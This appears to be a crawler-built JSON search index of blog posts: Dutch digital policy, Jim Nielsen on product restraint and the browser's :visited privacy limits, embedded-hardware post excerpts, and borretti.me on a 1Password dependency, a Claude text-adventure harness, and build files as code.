\u81ea\u52a8\u6293\u53d6</p>"},{"location":"berthub.eu/Digitaal%20zoet%20en%20zuur%20in%20het%20coalitieakkoord_20260202/","title":"Digitaal zoet en zuur in het coalitieakkoord","text":"<p>\u6765\u6e90: berthub.eu \u53d1\u5e03\u65f6\u95f4: Mon, 02 Feb 2026 12:00:00 +0100 \u94fe\u63a5: https://berthub.eu/articles/posts/digitaal-zoet-zuur-coalitie-akkoord/</p> <p>Het coalitieakkoord heeft een boel woorden die raken aan digitalisering, digitale autonomie en cybersecurity. Veel van de plannen komen niet uit de lucht vallen, en zijn gebaseerd op bijeenkomsten, gesprekken en documenten van de afgelopen jaren. Het is goed te zien dat men gebruik heeft gemaakt van dit eerdere werk (zoals het stuk Wolken aan de horizon, en Ons Digitaal Fundament). Specifiek moet het initiatief van de digitale club van D66 om samen te werken met de digitale zuster-afdelingen van CDA, GroenLinks-PvdA en VVD genoemd worden, waar een gezamenlijk document met input uit is gekomen.</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"blog.jim-nielsen.com/","title":"blog.jim-nielsen.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Saying \u201cNo\u201d In an Age of Abundance 20260203</li> <li>The Browser\u2019s Little White Lies 20260201</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"blog.jim-nielsen.com/Saying%20%E2%80%9CNo%E2%80%9D%20In%20an%20Age%20of%20Abundance_20260203/","title":"Saying \u201cNo\u201d In an Age of Abundance","text":"<p>\u6765\u6e90: blog.jim-nielsen.com \u53d1\u5e03\u65f6\u95f4: Tue, 03 Feb 2026 19:00:00 GMT \u94fe\u63a5: https://blog.jim-nielsen.com/2026/saying-no/</p> <p>You\u2019ve probably heard this famous quote from Steve Jobs about saying \u2018no\u2019:</p> <p>People think focus means saying yes to the thing you\u2019ve got to focus on. But that\u2019s not what it means at all. It means saying no to the hundred other good ideas that there are. You have to pick carefully. I\u2019m actually as proud of the things we haven\u2019t done as the things I have done. Innovation is saying no to 1,000 things.</p> <p>But wait, we have AI now. We don\u2019t have to say no to 1,000 things. We can say yes to all the things \u2014 generate them all, simultaneously!</p> <p>Do you really have to \u201cpick carefully\u201d when AI can materialize everything you previously would\u2019ve been too constrained to do?</p> <p>Generative technology paired with being \u201cdata-driven\u201d means it\u2019s easy to build every idea, ship it, measure it, and see what sticks.</p> <p>Humans, money, time \u2014 these all used to be constraints which required budgets, trade-offs, and decision making.</p> <p>Organizations had an incentive to say \u201cno\u201d when development was constrained \u2014 \u201cWe can only do so much, so let\u2019s make sure we do the most impactful things.\u201d</p> <p>But maybe the scarcity of organizational resources was the wrong focus all along?</p> <p>It\u2019s never been a good idea to ship everything you think of. Every addition accretes complexity and comes with a cognitive cost.</p> <p>Maybe we need to reframe the concept of scarcity from us, the makers of software, to them, the users of software. Their resources are what matter most:</p> <ul> <li>Attention (too many features and they can\u2019t all be used, or even tried)</li> <li>Stability (too much frequent change is an impediment to learning a product)</li> <li>Clarity (too many options creates confusion and paralysis)</li> <li>Coherence (too many plots and subplots cannot tell a unified story)</li> </ul> <p>So maybe the way you argue for saying \u201cno\u201d isn\u2019t because it helps you as a business, but because it helps your customers. It helps them make sense of what you\u2019ve made.</p> <p>And yet: arguing for customer clarity has always been harder than arguing for internal efficiency or some bottom line.</p> <p>In an age of abundance, restraint becomes the only scarce thing left, which means saying \u201cno\u201d is more valuable than ever.</p> <p>I\u2019m as proud of the things I haven\u2019t generated as the things I have.</p> <pre><code>&lt;hr /&gt;\n\n\n&lt;p&gt;\n  Reply via:\n\n\n  &lt;a href=\"mailto:jimniels%2Bblog@gmail.com?subject=Re:%20blog.jim-nielsen.com/2026/saying-no/\"&gt;Email&lt;/a&gt;\n  \u00b7 &lt;a href=\"https://mastodon.social/@jimniels\"&gt;Mastodon&lt;/a&gt; \u00b7\n\n  &lt;a href=\"https://bsky.app/profile/jim-nielsen.com\"&gt;Bluesky&lt;/a&gt;\n&lt;/p&gt;\n</code></pre> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:59</p>"},{"location":"blog.jim-nielsen.com/The%20Browser%E2%80%99s%20Little%20White%20Lies_20260201/","title":"The Browser\u2019s Little White Lies","text":"<p>\u6765\u6e90: blog.jim-nielsen.com \u53d1\u5e03\u65f6\u95f4: Sun, 01 Feb 2026 19:00:00 GMT \u94fe\u63a5: https://blog.jim-nielsen.com/2026/browsers-white-lies/</p> <p>So I\u2019m making a thing and I want it to be styled different if the link\u2019s been visited.</p> <p>Rather than build something myself in JavaScript, I figure I\u2019ll just hook into the browser\u2019s mechanism for tracking if a link\u2019s been visited (a sensible approach, if I do say so myself). </p> <p>Why write JavaScript when a little CSS will do? So I craft this:</p> <pre><code>.entry:has(a:visited) {\n  opacity: .5;\n  filter: grayscale(1);\n}\n</code></pre> <p>But it doesn\u2019t work.</p> <p><code>:has()</code> is relatively new, and I\u2019ve been known to muff it, so it\u2019s probably just a syntax issue.</p> <p>I start researching.</p> <p>Wouldn\u2019t you know it? We can\u2019t have nice things. <code>:visited</code> doesn\u2019t always work like you\u2019d expect because we (not me, mind you) exploited it.</p> <p>Here\u2019s MDN:</p> <p>You can style visited links, but there are limits to which styles you can use.</p> <p>While <code>:has()</code> is not mentioned specifically, other tricks like sibling selectors are:</p> <p>When using a sibling selector, such as <code>:visited + span</code>, the adjacent element (<code>span</code> in this example) is styled as though the link were unvisited.</p> <p>Why? You guessed it. Security and privacy reasons.</p> <p>If it were not so, somebody could come along with a little JavaScript and uncover a user\u2019s browsing history (imagine, for example, setting styles for visited and unvisited links, then using <code>window.getComputedStyle</code> and checking style computations).</p> <p>MDN says browsers tell little white lies:</p> <p>To preserve users' privacy, browsers lie to web applications under certain circumstances</p> <p>So, from what I can tell, when I write <code>.entry:has(a:visited)</code> the browser is telling the engine that handles styling that all <code>.entry</code> items have never been <code>:visited</code> (even if they have been).</p> <p>So where does that leave me?</p> <p>Now I will abandon CSS and go use JavaScript for something only JavaScript can do.</p> <p>That\u2019s a good reason for JS.</p> <pre><code>&lt;hr /&gt;\n\n\n&lt;p&gt;\n  Reply via:\n\n\n  &lt;a href=\"mailto:jimniels%2Bblog@gmail.com?subject=Re:%20blog.jim-nielsen.com/2026/browsers-white-lies/\"&gt;Email&lt;/a&gt;\n  \u00b7 &lt;a href=\"https://mastodon.social/@jimniels\"&gt;Mastodon&lt;/a&gt; \u00b7\n\n  &lt;a href=\"https://bsky.app/profile/jim-nielsen.com\"&gt;Bluesky&lt;/a&gt;\n&lt;/p&gt;\n</code></pre> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:59</p>"},{"location":"bogdanthegeek.github.io/","title":"bogdanthegeek.github.io\\n\\n\u7f51\u7ad9: https://bogdanthegeek.github.io\\nRSS: https://bogdanthegeek.github.io/blog/index.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- World's Cheapest ARM Debugger is Actually RISC-V_20260205\\n- MicroAlloc_20260205\\n- Hosting a WebSite on a Disposable Vape_20260205\\n- Making PCBs_20260205\\n- J-Link RTT for the Masses_20260205\\n","text":""},{"location":"bogdanthegeek.github.io/Hosting%20a%20WebSite%20on%20a%20Disposable%20Vape_20260205/","title":"Hosting a WebSite on a Disposable Vape\\n\\n\u6765\u6e90: https://bogdanthegeek.github.io\\n\u94fe\u63a5: https://bogdanthegeek.github.io/blog/projects/vapeserver/\\n\u65e5\u671f: Sat, 13 Sep 2025 13:26:02 +0100\\n\\n---\\n\\nPreface This article is NOT served from a web server running on a disposable vape. If you want to see the real deal, click here. The content is otherwise identical.","text":"<p>Background For a couple of years now, I have been collecting disposable vapes from friends and family. Initially, I only salvaged the batteries for \u201cfuture\u201d projects (It\u2019s not hoarding, I promise), but recently, disposable vapes have gotten more advanced. I wouldn\u2019t want to be the lawyer who one day will have to argue how a device with USB C and a rechargeable battery can be classified as \u201cdisposable\u201d.</p>"},{"location":"bogdanthegeek.github.io/J-Link%20RTT%20for%20the%20Masses_20260205/","title":"J-Link RTT for the Masses\\n\\n\u6765\u6e90: https://bogdanthegeek.github.io\\n\u94fe\u63a5: https://bogdanthegeek.github.io/blog/insights/jlink-rtt-for-the-masses/\\n\u65e5\u671f: Sun, 01 Jun 2025 14:47:43 +0100\\n\\n---\\n\\nTLDR; You can use semihosting on any ARM CPU to send and receive data in a few lines of code.","text":"<p>Click here to see an example implementation on a 10p \u201cdisposable\u201d microcontroller. Context There are many ways to debug embedded projects. For high speed stuff, you might toggle a pin at the beginning and end of a subroutine. On a more advanced project, you might have structured logging to a file-system.</p>"},{"location":"bogdanthegeek.github.io/Making%20PCBs_20260205/","title":"Making PCBs\\n\\n\u6765\u6e90: https://bogdanthegeek.github.io\\n\u94fe\u63a5: https://bogdanthegeek.github.io/blog/insights/making-pcbs/\\n\u65e5\u671f: Fri, 13 Jun 2025 15:40:03 +0100\\n\\n---\\n\\nWhy Bother? So, why would anyone bother making PCBs at home? The truth is that not many people do any more. In the year 2025, we have the ability to order high quality PCBs form China for next to nothing. If you just want a high quality board and you don\u2019t mind waiting a week or two, these are a great option.","text":"<p>I however, don\u2019t like to wait. I want a PCB in my hands the same day I finish the design.</p>"},{"location":"bogdanthegeek.github.io/MicroAlloc_20260205/","title":"MicroAlloc\\n\\n\u6765\u6e90: https://bogdanthegeek.github.io\\n\u94fe\u63a5: https://bogdanthegeek.github.io/blog/projects/microalloc/\\n\u65e5\u671f: Sun, 21 Sep 2025 16:13:00 +0100\\n\\n---\\n\\nTLDR; You can find the project repository here.","text":"<p>What? How? Why? A few Christmases ago, I was browsing the source code for the esp-idf heap allocator1 and thought: This is quite interesting, I should write my own allocator After a bit of looking around, I discovered that general purpose heap allocators are one of those problems that has no perfect solution (which is the kind of problem I really enjoy). It\u2019s all about trade-offs.</p>"},{"location":"bogdanthegeek.github.io/World%27s%20Cheapest%20ARM%20Debugger%20is%20Actually%20RISC-V_20260205/","title":"World's Cheapest ARM Debugger is Actually RISC-V\\n\\n\u6765\u6e90: https://bogdanthegeek.github.io\\n\u94fe\u63a5: https://bogdanthegeek.github.io/blog/projects/v003-dap/\\n\u65e5\u671f: Sun, 19 Oct 2025 15:07:31 +0100\\n\\n---\\n\\nBackground Continuing my work with arm debugging on free microcontrollers recovered from disposable vapes, I felt like using a $5 raspberry pi pico to program and debug these micros was a bit too extravagant, too bourgeoisie. A working man\u2019s microcontroller deserves a blue collar debugger to match. I have been using the 10\u00a2 ch32v003 RISC-V microcontroller for a few years now and I though it would be a perfect fit for this project.","text":""},{"location":"borretti.me/","title":"borretti.me","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>1Password Dependency Breaks Syntax Highlighting_20251227</li> <li>Letting Claude Play Text Adventures_20260112</li> <li>Some Data Should Be Code_20260131</li> <li>There Is No New Aesthetics_20260105</li> <li>Using the Brother DS-640 Scanner on NixOS_20251227</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"borretti.me/1Password%20Dependency%20Breaks%20Syntax%20Highlighting_20251227/","title":"1Password Dependency Breaks Syntax Highlighting","text":"<p>\u6765\u6e90: borretti.me \u53d1\u5e03\u65f6\u95f4: Sat, 27 Dec 2025 01:00:00 +0000 \u94fe\u63a5: https://borretti.me/article/1password-dependency-breaks-syntax-highlighting</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' Earlier today I noticed the syntax highlighting on this website was broken. But\\nnot fully: on reload I\u2019d see a flash of highlighted text, that then turned\\nmonochrome. The raw HTML from curl showed rouge tags, but the web inspector\\nshowed raw text inside the <code> elements. This didn\u2019t happen in Chromium. \\n\\n My first thought was: there\u2019s malformed HTML, and Firefox is recovering in a way\\nthat loses the DOM inside <code> tags. Then I noticed it doesn\u2019t happen in\\nincognito. Turning my extensions off one by one, I found that 1Password is\\nresponsible. Others ( 1 , 2 ) have reported this also. If you\\nextract the latest XPI , unzip it, and dig around, you\u2019ll find they\u2019re\\nusing Prism.js , a JavaScript syntax highlighter. \\n\\n I don\u2019t know why a password manager needs a syntax highlighter. I imagine it has\\nto do with the app feature where, if you have an SSH key, you can open a modal \\nthat tells you how to configure Git commit signing using. Maybe they want to\\nhighlight the SSH configuration code block (which is unnecessary anyways, since\\nyou could write that HTML by hand). But I can\u2019t know for sure. \\n\\n Why write about this? Because 1Password is a security critical product, and they\\nare apparently pulling random JavaScript dependencies and unwittingly running\\nthem in the tab context , where the code has access to everything. This is\\nno good. I don\u2019t need to explain how bad a supply-chain attack on the 1Password\\nbrowser extension would be. \\n\\n I like 1Password and I was sad when Apple Sherlocked them with the\\n Passwords app, but this is a bad sign about their security practices. '} <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:56:53</p>"},{"location":"borretti.me/Letting%20Claude%20Play%20Text%20Adventures_20260112/","title":"Letting Claude Play Text Adventures","text":"<p>\u6765\u6e90: borretti.me \u53d1\u5e03\u65f6\u95f4: Mon, 12 Jan 2026 00:00:00 +0000 \u94fe\u63a5: https://borretti.me/article/letting-claude-play-text-adventures</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' The other day I went to an AI hackathon organized by my friends\\n Lucia and Malin . The theme was mech interp , but I hardly\\nknow PyTorch so I planned to do something at the API layer rather than the model\\nlayer. \\n\\n Something I think about a lot is cognitive architectures (like\\n Soar and ACT-R ). This is like a continuation of GOFAI \\nresearch, inspired by cognitive science. And like GOFAI it\u2019s never yielded\\nanything useful. But I often think: can we scaffold LLMs with cog arch-inspired\\nharnesses to overcome their limitations? \\n\\n LLM agents like Claude Code are basically \u201caccidental\u201d cognitive\\narchitectures: they are designed and built my practitioners rather than\\ntheorists, but they have commonalities, they all need a way to manage memory,\\ntool use, a task agenda etc. Maybe building an agent on a more \u201cprincipled\u201d\\nfoundation, one informed by cognitive science, yields a higher-performing\\narchitecture. \\n\\n So I sat around a while thinking how to adapt Soar\u2019s architecture to an LLM\\nagent. And I sketched something out, but then I thought: how can I prove this\\nperforms better than baseline? I need an eval, a task. \\n\\n Math problems? Too one-shottable. A chatbot? Too interactive, I want something\\nhands-off and long-horizon. A coding agent? That\u2019s too freeform and requires too\\nmuch tool use. And then I thought: text adventures ! You have a stylized,\\nhierarchically-structured world accessible entirely tthrough text, long-term\\ngoals, puzzles, physical exploration and discovery of the environment. Even the\\ndata model of text adventures resembles frame-based knowledge\\nrepresentation systems. And there\u2019s a vast collection of games available\\nonline. \\n\\n Anchorhead , which I played years ago, is a Lovecraft-inspired text\\nadventure by Michael S. Gentry. It takes on the order of hundrds of turns to win\\nacross multiple in-game days. And the game world is huge and very open. In other\\nwords: a perfect long-horizon task. \\n\\n So I started hacking. The frotz interpreter runs on the command line and has a\\n\u201cdumb\u201d interface called dfrotz , which takes the ncurses fluff out, and gives\\nyou a very stripped command-line experience. It looks like this: \\n\\n \\n \\n $ dfrotz games/anchor.z8\\n...\\n Outside the Real Estate Office                      day one\\n\\nANCHORHEAD\\nAn interactive gothic by Michael S. Gentry\\n\\n(Type HELP or ABOUT for some useful information.)\\n\\nRelease 5 / Serial number 990206 / Inform v6.15 Library 6/7\\n\\nOutside the Real Estate Office\\nA grim little cul-de-sac, tucked away in a corner of the claustrophobic tangle\\nof narrow, twisting avenues that largely constitute the older portion of\\nAnchorhead. Like most of the streets in this city, it is ancient, shadowy, and\\nleads essentially nowhere. The lane ends here at the real estate agent\\'s office,\\nwhich lies to the east, and winds its way back toward the center of town to the\\nwest. A narrow, garbage-choked alley opens to the southeast.\\n\\n&gt;go southeast\\n Alley                                               day one\\n\\nAlley\\nThis narrow aperture between two buildings is nearly blocked with piles of\\nrotting cardboard boxes and overstuffed garbage cans. Ugly, half-crumbling brick\\nwalls to either side totter oppressively over you. The alley ends here at a\\ntall, wooden fence.\\n\\nHigh up on the wall of the northern building there is a narrow, transom-style\\nwindow.\\n \\n \\n \\n\\n It is easy to write a little Python wrapper to drive the interpreter through\\n stdin and stdout : \\n\\n \\n \\n class Interpreter : \\n \"\"\"Manages the dfrotz Z-machine interpreter process.\"\"\" \\n\\n p : Popen \\n\\n def init ( self ): \\n log ( \"Starting dfrotz.\" ) \\n p : Popen = Popen ( \\n [ \"dfrotz\" , \"-m\" , GAME ], \\n stdin = PIPE , \\n stdout = PIPE , \\n stderr = PIPE , \\n ) \\n log ( f \"Started dfrotz with PID= { p . pid } .\" ) \\n</p>"},{"location":"borretti.me/Letting%20Claude%20Play%20Text%20Adventures_20260112/#set-stdoutstderr-to-non-blocking-moden","title":"Set stdout/stderr to non-blocking mode.\\n","text":"<p>for stream in</p> <p>assert stream is not None \\n fd = stream . fileno () \\n flags = fcntl . fcntl ( fd , fcntl . F_GETFL ) \\n fcntl . fcntl ( fd , fcntl . F_SETFL , flags | os . O_NONBLOCK ) \\n self . p = p \\n\\n def read ( self ) -&gt; str : \\n assert self . p . stdout is not None \\n b : bytes | None = self . p . stdout . read () \\n if b is not None : \\n t : str = b . decode ( \"utf-8\" ) \\n return t \\n else : \\n return \"\" \\n\\n def write ( self , t : str ) -&gt; None : \\n assert self . p . stdin is not None \\n self . p . stdin . write ( t . encode ( \"utf-8\" )) \\n self . p . stdin . flush () \\n</p>"},{"location":"borretti.me/Letting%20Claude%20Play%20Text%20Adventures_20260112/#give-the-interpreter-time-to-respond-not-idealn","title":"Give the interpreter time to respond. Not ideal!\\n","text":"<p>time . sleep ( 0.1 ) \\n \\n \\n \\n\\n Now we can play the game from Python: send commands, get game output. Now we\\nneed the dual of this: a player. \\n\\n \\n \\n class Player ( ABC ): \\n \"\"\"\\n    Interface for game-playing agents.\\n    \"\"\" \\n\\n @ abstractmethod \\n def cycle ( self , text : str ) -&gt; str : \\n \"\"\"\\n        Send the game\\'s output to the agent, and return the next command to execute.\\n        \"\"\" \\n pass \\n \\n \\n \\n\\n The Trivial Harness \\n\\n The trivial harness is basically nothing at all: treat the LLM/game interaction\\nlike a chat history. The LLM reads the game output from the interpreter, writes\\nsome reasoning tokens, and writes a command that is sent via stdin to the\\ninterpreter. \\n\\n \\n \\n SYSTEM_PROMPT : str = \"\"\"\\nHello Claude. Your task is to play an adventure game. I\\'ve hooked up\\nyour output to the dfrotz (dumb frotz) interpreter.\\n\\nThe structure of your output is fairly freeform. The first line that\\nstarts with <code>&gt;</code> (and only the first line!) is interpreted as a game\\ncommand, everything else is uninterpreted commentary, e.g. you may\\nwrite:\\n\\n    We should go north to explore the church.\\n\\n    &gt;go north\\n\\n    Maybe we can use the silver key there.\\n\\nIf you write multiple <code>&gt;</code> lines in one response, all but the first\\nwill be ignored.\\n\\nHave fun! \ud83d\ude0a\\n\"\"\" \\n\\n\\n class SimplePlayer ( Player ): \\n \"\"\"\\n    The simplest game-playing agent: keep the entire game histoyr in-context.\\n    \"\"\" \\n\\n client : Anthropic \\n history : list [ tuple [ EntryType , str ]] \\n\\n def init ( self ): \\n self . client = Anthropic () \\n self . history = [] \\n\\n def cycle ( self , text : str ) -&gt; str : \\n self . history . append (( EntryType . GAME , text )) \\n system = trim ( SYSTEM_PROMPT ) \\n messages : list [ MessageParam ] = [] \\n for entry_type , entry_text in self . history : \\n role : str \\n match entry_type : \\n case EntryType . GAME : \\n role = \"user\" \\n case EntryType . COMMAND : \\n role = \"assistant\" \\n messages . append ( \\n { \\n \"role\" : role , \\n \"content\" : entry_text , \\n } \\n ) \\n message : Message = self . client . messages . create ( \\n max_tokens = 512 , \\n model = MODEL , \\n system = system , \\n messages = messages , \\n ) \\n log ( f \"Tokens: { message . usage . input_tokens } \" ) \\n response : str = message . content [ 0 ]. text \\n log_claude ( response ) \\n lines : list [ str ] = [ line for line in response . split ( \" \\n \" ) if line ] \\n cmd : str = [ line for line in lines if line . startswith ( \"&gt;\" )][ 0 ][ 1 :] \\n self . history . append (( EntryType . COMMAND , response )) \\n return cmd \\n \\n \\n \\n\\n And this works well enough. Haiku 4.5 would mostly wander around the game map,\\nbut Sonnet 4.5 and Opus 4.5 manage to solve the game\u2019s first puzzle\u2014breaking\\ninto the real estate office, and finding the keys to the mansion\u2014readily\\nenough. It takes about ~200 turns for Claude to get to the second in-game day. \\n\\n The way I thought this would fail is: attention gets smeared across the long\\ncontext, the model gets confused about the geometry of the world, its goal and\\ntask state, and starts confabulating, going in circles, etc. \\n\\n As usual, I was outsmarting myself. The reason this fails is you run out of\\ncredits. By the time you get to day two, each turn costs tens of thousands of\\ninput tokens. No good! We need a way to save money. \\n\\n Memory \\n\\n Ok, let\u2019s try something that\u2019s easier on my Claude credits. We\u2019ll show Claude\\nthe most recent five turns (this is the perceptual working memory), and give it\\na simple semantic memory: a list of strings that it can append entries to, and\\nremove entries from using tool use. \\n\\n This keeps the token usage down: \\n\\n \\n\\n The problem is the narrow time horizon. With the trivial harness, Claude can\\nbreak into the real estate office in ~10 turns, and does so right at the start\\nof the game. With this new harness, Claude wanders about the town, taking\\ncopious notes, before returning to the real estate office, and it spends ~40\\nturns fumbling around with the garbage cans before managing to break into the\\nreal estate office. \\n\\n The next step, after getting the keys to the house, is to meet your husband\\nMichael at the University and head home. Claude with the trivial harness takes\\nabout ~100 turns to find the house, with some tangential wandering about the\\ntown, and reaches day two around turn 150. \\n\\n Claude, with the memory harness, took ~250 turns just to get the keys to the\\nhouse. And then it spends hundreds of turns just wandering in circles around the\\ntown, accumulating redundant memories, and hits the turn limit before even\\nfinding the house. \\n\\n Aside: Small Worlds \\n\\n Anchorhead is a long, broad game, and from the very beginning you can forget\\nthe plot and wander about most of the town. It takes a long time to see if a run\\nwith an agent goes anywhere. So I thought: I need something smaller. \\n\\n Unsurprisingly, Claude can make its own games. The Inform 7 package for\\nNixOS was broken (though Mikael has fixed this recently) so I had\\nto use Inform 6 . I started with a trivial escape-the-room type game, which\\nwas less than 100 lines of .inf code and any Claude could beat it less than 10\\nturns. Then I asked for a larger, multi-room heist game. \\n\\n This one was more fun. It\u2019s short enough that Claude can win with just the\\ntrivial harness. I tried a different harness, where Claude has access to only\\nthe last five turns of the game\u2019s history, and a read-write memory\\nscratchpad. And this one was interesting. \\n\\n First, because Claude only ever adds to its own memory, it never deletes\\nmemories. I thought it would do more to trim and edit its scratchpad. \\n\\n Second, because Claude become fixated on this red-herring room: a garden with a\\nwell. It kept going in circles, trying to tie a rope to the well and climb\\ndown. Because of the limited game history, it only realized it was stuck when it\\nsaw that the most recent ~20 entries it wrote to its memories related to various\\nattempts to go down the well. Then I watched Claude walk away from the garden\\nand solve the final puzzle, and hit the turn limit just two turns short of\\nwinning. \\n\\n Tangent: I wonder if models are better at playing games created by other\\ninstances of the same model, by noticing tiny correlations in the text to infer\\nwhat puzzles and obstacles they would have written. \\n\\n In the end I abandoned the \u201csmall worlds\u201d approach because the games are too\\nstylized, linear, and uninteresting. Anchorhead is more unwieldy, but more\\nnatural. \\n\\n Future Work \\n\\n I have a bunch of ideas I want to test, to better learn how harness\\nimplementations affect performance. But I\u2019m short on time, so I\u2019m cutting it\\nhere and listing these as todos: \\n\\n \\n Domain-Specific Memories: Claude\u2019s notes are all jumbled with information\\non tasks, locations, etc. It might be better to have separate memories: a todo\\nlist, a memory of locations and their connections, etc. This is close to the\\nSoar approach. \\n Automatic Geography: related to the above, the harness can inspect the\\ngame output and build up a graph of rooms and their connections, and format it\\nin the context. This saves Claude having to note those things manually using a\\ntool. \\n Manual Geography: the automatic geography approach has a few\\ndrawbacks. Without integration into the Z-machine interpreter, it requires\\nsome work to implement (parsing the currente location from the dfrotz \\noutput, keeping track of the command history to find standard travel commands\\ne.g. go south ) but isn\u2019t 100% deterministic, so that mazes and dynamic rooms\\n(e.g. elevators) will confuse the system. So, instead of doing it manually, we\\ncould give Claude a tool like link(room, direction, other_room) . \\n Episodic Memory: this feels like cheating, but, at the end of a run, you\\ncan show Claude the session transcript and ask it to summarize: what it\\naccomplished and how, where it failed and why. Including a short walkthrough\\nfor how to get to the \u201clast successful state\u201d. This allows future runs to save\\ntime in getting up to speed. \\n \\n\\n Code \\n\\n The repository is here . '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:56:50</p>"},{"location":"borretti.me/Some%20Data%20Should%20Be%20Code_20260131/","title":"Some Data Should Be Code","text":"<p>\u6765\u6e90: borretti.me \u53d1\u5e03\u65f6\u95f4: Sat, 31 Jan 2026 00:00:00 +0000 \u94fe\u63a5: https://borretti.me/article/some-data-should-be-code</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' I write a lot of Makefiles . I use it not as a command runner but as an ad-hoc build system for small projects, typically for compiling Markdown documents and their dependencies. Like so: \\n\\n \\n\\n And the above graph was generated by this very simple Makefile: \\n\\n \\n \\n graph.png : graph.dot \\n dot -Tpng $&lt; -o $@ \\n\\n clean : \\n rm -f graph.png \\n \\n \\n \\n\\n (I could never remember the automatic variable syntax until I made flashcards for them.) \\n\\n It works for simple projects, when you can mostly hand-write the rules. But the abstraction ceiling is very low. If you have a bunch of almost identical rules, e.g.: \\n\\n \\n \\n a.png : a.csv plot.py \\n python plot.py $&lt; $@ \\n\\n b.png : b.csv plot.py \\n python plot.py $&lt; $@ \\n\\n c.png : c.csv plot.py \\n python plot.py $&lt; $@ \\n \\n \\n \\n\\n You can use pattern-matching to them into a \u201crule schema\u201d, by analogy to axiom schemata: \\n\\n \\n \\n %.png : %.csv plot.py \\n python plot.py $&lt; $@ \\n \\n \\n \\n\\n Which works backwards: when something in the build graph depends on a target matching %.png , Make synthesizes a rule instance with a dependency on the corresponding .csv file. \\n\\n But pattern matching is still very limited. Lately I\u2019ve been building my own plain-text accounting solution using some Python scripts. One of the tasks is to read a CSV of bank transactions from 2019\u20132024 and split it into TOML files for each year-month, to make subsequent processing parallelizable. So the rules might be something like: \\n\\n ledger/2019-08.toml: inputs/checkbook_pro_export.csv\\n    uv run import_from_checkbook.py --year=2019 --month=8\\n\\nledger/2019-09.toml: inputs/checkbook_pro_export.csv\\n    uv run import_from_checkbook.py --year=2019 --month=9\\n\\n# ...\\n \\n\\n I had to write a Python script to generate the complete Makefile. Makefiles look like code, but are data: they are a container format for tiny fragments of shell that are run on-demand by the Make engine. And because Make doesn\u2019t scale, for complex tasks you have to bring out a real programming language to generate the Makefile. \\n\\n I wish I could, instead, write a make.py file with something like this: \\n\\n \\n \\n from whatever import * \\n\\n g = BuildGraph () \\n\\n EXPORT : str = \"inputs/checkbook_pro_export.csv\" \\n\\n</p>"},{"location":"borretti.me/Some%20Data%20Should%20Be%20Code_20260131/#the-year-month-pairs-i-have-bank-transaction-csvs-forn","title":"The (year, month) pairs I have bank transaction CSVs for.\\n","text":"<p>year_months : list [ tuple [ int , int ]] = [ \\n ( y , m ) for y in range ( 2019 , 2026 ) for m in range ( 1 , 13 ) \\n ] \\n\\n</p>"},{"location":"borretti.me/Some%20Data%20Should%20Be%20Code_20260131/#import-transactions-for-each-year-month-into-a-separate-ledgern","title":"Import transactions for each year-month into a separate ledger.\\n","text":"<p>for year , month in year_months : \\n ledger_path : str = f \"ledger/ { year } _ { month : 02 d } .toml\" \\n g . rule ( \\n targets = [ ledger_path ], \\n deps = [ EXPORT ], \\n fn = lambda : import_from_checkbook ( ledger_path , year , month ), \\n ) \\n \\n \\n \\n\\n Fortunately this exists: it\u2019s called doit , but it\u2019s not widely known. \\n\\n \\n\\n A lot of things are like Makefiles: data that should be lifted one level up to become code. \\n\\n Consider CloudFormation . Nobody likes writing those massive YAML files by hand, so AWS introduced CDK , which is literally just a library 1 of classes that represent AWS resources. Running a CDK program emits CloudFormation YAML as though it were an assembly language for infrastructure. And so you get type safety, modularity, abstraction, conditionals and loops, all for free. \\n\\n Consider GitHub Actions . How much better off would we be if, instead of writing the workflow-job-step tree by hand, we could just have a single Python script, executed on push, whose output is the GitHub Actions YAML-as-assembly? So you might write: \\n\\n \\n \\n from ga import * \\n from checkout_action import CheckoutAction \\n from rust_action import RustSetupAction \\n\\n</p>"},{"location":"borretti.me/Some%20Data%20Should%20Be%20Code_20260131/#define-the-workflow-that-runs-on-each-commitn","title":"Define the workflow that runs on each commit.\\n","text":""},{"location":"borretti.me/Some%20Data%20Should%20Be%20Code_20260131/#commit_workflow","title":"commit_workflow","text":"<p>Workflow ( \\n name = \"commit\" , \\n test = lambda ev : isinstance ( ev , CommitEvent ), \\n jobs = [ \\n</p>"},{"location":"borretti.me/Some%20Data%20Should%20Be%20Code_20260131/#the-lint-jobn","title":"The lint job.\\n","text":"<p>Job ( \\n name = \"lint\" , \\n steps = [ \\n Step ( \\n name = \"check out\" , \\n run = CheckoutAction (), \\n ), \\n Step ( \\n name = \"set up Rust and Cargo\" , \\n run = RustSetupAction (), \\n ), \\n Step ( \\n name = \"run cargo fmt\" , \\n run = Shell ([ \"cargo\" , \"fmt\" , \"--check\" ]) \\n ) \\n ] \\n ) \\n ] \\n ) \\n \\n \\n \\n\\n Actions here would simply be ordinary Python libraries the CI script depends on. Again: conditions, loops, abstraction, type safety, we get all of those for free by virtue of using a language that was designed to be a language, rather than a data exchange language that slowly grows into a poorly-designed DSL. \\n\\n Why do we repeatedly end up here? Static data has better safety/static analysis properties than code, but I don\u2019t think that\u2019s foremost in mind when people design these systems. Besides, using code to emit data (as CDK does) gives you those exact same properties. Rather, I think some people think it\u2019s cute and clever to build tiny DSLs in a data format. They\u2019re proud that they can get away with a \u201csimple\u201d, static solution rather than a dynamic one. \\n\\n If you\u2019re building a new CI system/IaC platform/Make replacement: please just let me write code to dynamically create the workflow/infrastructure/build graph. \\n\\n 